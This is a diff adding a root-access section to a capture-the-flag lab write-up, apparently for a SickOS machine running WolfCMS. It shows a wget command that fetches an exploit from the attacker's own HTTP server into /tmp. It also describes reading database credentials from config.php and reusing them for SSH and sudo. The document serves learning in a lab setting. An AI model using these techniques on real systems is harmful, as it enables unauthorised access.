@@ -68,8 +68,29 @@ Now I checked my kali terminal, and I had a shell popped open.
 
 ![shell](https://user-images.githubusercontent.com/76433661/152643328-bd97c07c-0dfb-4923-b709-9a4e67290be9.png)
 
-## Privilege Escalation
+## Getting the root access
 
 Now that I have a working shell, I need to gain root access. 
 
+At first, I thought this is a privilege escalation problem so I researched lot about Kernel exploitation. I donwloaded two exploit from exploit-db.com, and copied the file over to `/tmp` folder using `python3 -m http.server` and `wget http://172.16.126.129:8000/exploit.c`.
+
+However, after several tries, I found out I am stuck and moved on to different perspective.
+
+I moved my directory to `/var/www/wolfcms` to see what information I can find. 
+
+![ls_wolfcms](https://user-images.githubusercontent.com/76433661/152644770-c0ecb483-5b6a-46ef-aca9-01ec68447f41.png)
+
+I took a look at `config.php` file, and there was mysql username and password. *findout the password and username byyouself*
+
+Now that I have potential username and password, I tried `ssh`.
+
+I first tried the username `root`, but it was not it, so I tired the username `sickos`, which worked out. 
+
+![ssh](https://user-images.githubusercontent.com/76433661/152644825-81891229-0ae7-4973-a5f8-db0a728a75c0.png)
+
+I changed the user by `sudo su root`
+
+Moved my working directory to `/root` and found the flag. 
+
+![end](https://user-images.githubusercontent.com/76433661/152644896-43482539-fcda-4920-b988-48db3dac8ea8.png)
 
